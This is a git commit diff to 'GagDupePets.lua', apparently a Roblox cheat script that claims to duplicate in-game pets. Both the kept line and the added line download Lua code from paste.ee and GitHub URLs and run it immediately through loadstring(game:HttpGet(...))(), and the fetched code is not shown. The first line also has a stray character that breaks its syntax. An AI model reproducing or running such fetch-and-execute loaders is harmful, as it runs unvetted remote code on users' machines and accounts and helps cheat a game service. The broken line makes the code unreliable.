cdbb93a288a53795a567939772753798b6776a88
RimuruScript1 <eduardmesias0@gmail.com>
2025-06-05 14:54:43 +0800

    Update GagDupePets.lua

--- GagDupePets.lua
+++ GagDupePets.lua
@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://paste.ee/r/0AHzluLB"))()j
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RimuruScript1/Script-Y-Dupe/refs/heads/main/GagDupePets.lua"))()
